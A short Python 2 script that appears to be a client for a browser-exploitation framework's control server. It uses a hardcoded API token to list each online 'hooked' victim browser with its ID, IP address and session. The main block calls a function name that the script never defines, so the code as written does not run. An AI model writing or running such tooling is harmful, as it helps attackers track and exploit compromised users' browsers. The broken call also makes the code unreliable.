#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ** Author: ssooking

import json
import urllib2


def getHookedBrowsersSession(host,authkey):
    f = urllib2.urlopen(host + "/api/hooks?token=" + authkey)
    data = json.loads(f.read())
    hookonline = data['hooked-browsers']['online']
    for x in hookonline:
        hookid = hookonline[x]['id']
        hookip = hookonline[x]['ip']
        hooksession = hookonline[x]['session']
        print "\n[+] Hooked host id:  " + bytes(hookid) + "\n   >>> IP: " + bytes(hookip) + "\n   >>> Session: " + hooksession


if __name__ == '__main__':
	host = "http://192.168.1.133:3000/"
	key = "2c878d9a69d5d1fc58fb8ab0c30fb64e492903d7"
	getHookedBrowsers2(host,key)